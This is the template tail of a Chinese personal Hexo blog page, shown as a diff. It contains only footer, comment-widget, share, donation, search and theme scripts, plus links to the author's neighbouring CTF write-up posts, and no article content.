+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">n0rt6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '5s6sYhVyYIhL1fb7zrErH8BX-gzGzoHsz',
+        appKey: '829xTABHQSNKYRHRILDlEluh',
+        notify: 'true' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '请畅所欲言'
+    });
+</script>
+
+    
+
+    
+
+    
+        
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/06/23/ctfshoow-nodejs/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="ctfshoow-nodejs">
+                        
+                        <span class="card-title">ctfshoow-nodejs</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            wp
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctfshow/" class="post-category">
+                                    ctfshow
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="CTF 用于伪造ip的http请求头">
+                        
+                        <span class="card-title">CTF 用于伪造ip的http请求头</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CTF 用于伪造ip的http请求头
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="post-category">
+                                    知识点
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('200')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: n0rt6&#39;s bolg<br />'
+            + '文章作者: n0rt6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="2036374924"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.2'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="/about" target="_blank">n0rt6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">73.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2022";
+                    var startMonth = "12";
+                    var startDate = "7";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/3143047748" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3143047748@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3143047748" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3143047748" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    
+    
+    <script type="text/javascript">
+        var OriginTitile=document.title,st;
+        document.addEventListener("visibilitychange",function(){
+            document.hidden?(document.title="ヽ(●-`Д´-)ノ你不回来了嘛",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ好呀好呀！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+        })
+    </script>
+    
+    <!-- 冒泡 -->
+    
+        <script type="text/javascript">
+          // 只在桌面版网页启用特效
+          var windowWidth = $(window).width();
+          document.write(
+              '<script type="text/javascript" src="/libs/others/buble.js"><\/script>');
+        </script>
+    
+    
+    <!-- 白天和黑夜主题 -->
+<div class="sum-moon-box">
+    <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="切换主题" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
+    </a>
+  </div>
+  
+  <script>
+    function switchNightMode() {
+      $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+          $('body').hasClass('DarkMode')
+          ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon'))
+          : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+  
+          setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+              $(this).remove()
+            })
+          }, 2e3)
+        })
+    }
+  </script>
+
+<div class="stars-con">
+  <div id="stars"></div>
+  <div id="stars2"></div>
+  <div id="stars3"></div>
+</div>
+
+
+    /* 模式判断 */
+    <script>
+      /* 模式判断 */
+      if (localStorage.getItem('isDark') === '1') {
+        document.body.classList.add('DarkMode');
+        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
+      } else {
+        document.body.classList.remove('DarkMode');
+        $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')
+      }
+    </script>
+
+</body>
+
+</html>
